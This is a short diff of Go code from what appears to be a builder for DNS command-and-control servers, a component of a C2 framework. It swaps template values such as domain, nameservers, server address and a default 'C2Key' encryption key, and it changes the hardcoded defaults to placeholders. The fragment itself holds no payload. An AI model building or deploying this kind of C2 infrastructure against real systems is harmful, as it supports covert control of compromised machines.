@@ -541,13 +541,13 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	fmt.Printf("[Builder] Replacing MasterAPIKey with: %s\n", apiKey)
 	fmt.Printf("[Builder] Replacing MasterServerID with: %s\n", serverID)
 
-	configStr = strings.ReplaceAll(configStr, "Domain:        \"secwolf.net\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain))
-	configStr = strings.ReplaceAll(configStr, "NS1:           \"ns1.secwolf.net\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1))
-	configStr = strings.ReplaceAll(configStr, "NS2:           \"ns2.secwolf.net\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2))
+	configStr = strings.ReplaceAll(configStr, "Domain:        \"example.com\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain))
+	configStr = strings.ReplaceAll(configStr, "NS1:           \"ns1.example.com\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1))
+	configStr = strings.ReplaceAll(configStr, "NS2:           \"ns2.example.com\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2))
 	configStr = strings.ReplaceAll(configStr, "UpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("UpstreamDNS:   \"%s\",", req.UpstreamDNS))
 	configStr = strings.ReplaceAll(configStr, "EncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("EncryptionKey: \"%s\",", req.EncryptionKey))
 	if req.ServerAddress != "" {
-		configStr = strings.ReplaceAll(configStr, "SvrAddr:       \"98.90.218.70\",", fmt.Sprintf("SvrAddr:       \"%s\",", req.ServerAddress))
+		configStr = strings.ReplaceAll(configStr, "SvrAddr:       \"1.2.3.4\",", fmt.Sprintf("SvrAddr:       \"%s\",", req.ServerAddress))
 	}
 	// Set distributed mode config (required fields) - replace ALL occurrences
 	// Handle both with and without comments
